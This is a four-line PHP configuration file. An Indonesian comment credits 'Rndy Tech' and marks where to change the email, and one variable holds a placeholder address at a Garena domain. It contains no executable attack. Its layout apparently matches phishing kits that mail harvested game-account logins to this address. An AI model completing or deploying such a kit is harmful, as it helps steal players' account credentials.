<?php
// TEMPAT GANTI EMAIL, SCRIPT BY RNDY TECH
$rndytech = 'emailkamu@garena.co.id';
?>